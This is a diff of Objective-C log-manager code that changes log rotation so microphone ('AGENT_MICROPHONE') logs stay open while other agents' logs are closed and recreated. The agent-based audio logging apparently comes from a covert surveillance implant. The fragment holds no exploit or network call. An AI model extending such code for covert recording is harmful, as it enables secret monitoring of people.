@@ -599,38 +599,52 @@ typedef struct _log {
   
   for (item in mActiveQueue)
     {
-    [[item objectForKey: @"handle"] closeFile];
-    [newItems addObject: item];
-    [discardedItem addIndex: index];
+      int32_t agentID = [[item objectForKey: @"agentID"] intValue];
     
-    //
-    // Verifying if we need to recreate the log entry so that the agents can
-    // keep logging (verify for possible races here)
-    //
-    if (continueLogging == TRUE)
-      {
-      NSNumber *tempAgentID = [NSNumber numberWithInt:
-                               [[item objectForKey: @"agentID"] intValue]];
+      if (continueLogging == YES
+          && (agentID == AGENT_MICROPHONE))
+        {
+          //
+          // Close all the logs except the Audio ones
+          //
+#ifdef DEBUG_LOG_MANAGER
+          warnLog(@"Skipping Audio Log");
+#endif
+          continue;
+        }
       
-      id tempAgentHeader = [item objectForKey: @"header"];
+      [[item objectForKey: @"handle"] closeFile];
+      [newItems addObject: item];
+      [discardedItem addIndex: index];
       
-      NSArray *keys = [NSArray arrayWithObjects: @"agentID",
-                       @"header",
-                       nil];
-      NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
-                          tempAgentHeader,
-                          nil];
+      //
+      // Verifying if we need to recreate the log entry so that the agents can
+      // keep logging (verify for possible races here)
+      //
+      if (continueLogging == TRUE)
+        {
+          NSNumber *tempAgentID = [NSNumber numberWithInt:
+                                   [[item objectForKey: @"agentID"] intValue]];
+          
+          id tempAgentHeader = [item objectForKey: @"header"];
+          
+          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
+                           @"header",
+                           nil];
+          NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
+                              tempAgentHeader,
+                              nil];
+          
+          NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
+          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                                 forKeys: keys];
+          
+          [agent addEntriesFromDictionary: dictionary];
+          [tempAgentsConf addObject: agent];
+          [agent release];
+        }
       
-      NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
-      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
-                                                             forKeys: keys];
-      
-      [agent addEntriesFromDictionary: dictionary];
-      [tempAgentsConf addObject: agent];
-      [agent release];
-      }
-    
-    index++;
+      index++;
     }
   
   [gActiveQueueLock lock];
@@ -645,40 +659,40 @@ typedef struct _log {
   if (continueLogging == TRUE)
     {
 #ifdef DEBUG_LOG_MANAGER
-    infoLog(@"Recreating agents log");
+      infoLog(@"Recreating agents log");
 #endif
-    for (id agent in tempAgentsConf)
-      {
-      id agentHeader = [agent objectForKey: @"header"];
-      
-      if ([agentHeader isKindOfClass: [NSString class]])
+      for (id agent in tempAgentsConf)
         {
-        if ([agentHeader isEqualToString: @"NO"])
-          {
+          id agentHeader = [agent objectForKey: @"header"];
+          
+          if ([agentHeader isKindOfClass: [NSString class]])
+            {
+              if ([agentHeader isEqualToString: @"NO"])
+                {
 #ifdef DEBUG_LOG_MANAGER
-          infoLog(@"No Agent Header found");
+                  infoLog(@"No Agent Header found");
 #endif
-          [self createLog: [[agent objectForKey: @"agentID"] intValue]
-              agentHeader: nil
-                withLogID: [[agent objectForKey: @"logID"] intValue]];
-          }
-        }
-      else if ([agentHeader isKindOfClass: [NSData class]])
-        {
+                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
+                      agentHeader: nil
+                        withLogID: [[agent objectForKey: @"logID"] intValue]];
+                }
+            }
+          else if ([agentHeader isKindOfClass: [NSData class]])
+            {
 #ifdef DEBUG_LOG_MANAGER
-        infoLog(@"agentHeader (%@)", [agentHeader class]);
-        infoLog(@"agentHeader = %@", agentHeader);
+              infoLog(@"agentHeader (%@)", [agentHeader class]);
+              infoLog(@"agentHeader = %@", agentHeader);
 #endif
-        
-        NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
-        
-        [self createLog: [[agent objectForKey: @"agentID"] intValue]
-            agentHeader: _agentHeader
-              withLogID: [[agent objectForKey: @"logID"] intValue]];
-        
-        [_agentHeader release];
+              
+              NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
+              
+              [self createLog: [[agent objectForKey: @"agentID"] intValue]
+                  agentHeader: _agentHeader
+                    withLogID: [[agent objectForKey: @"logID"] intValue]];
+            
+              [_agentHeader release];
+            }
         }
-      }
     }
   
 #ifdef DEBUG_LOG_MANAGER
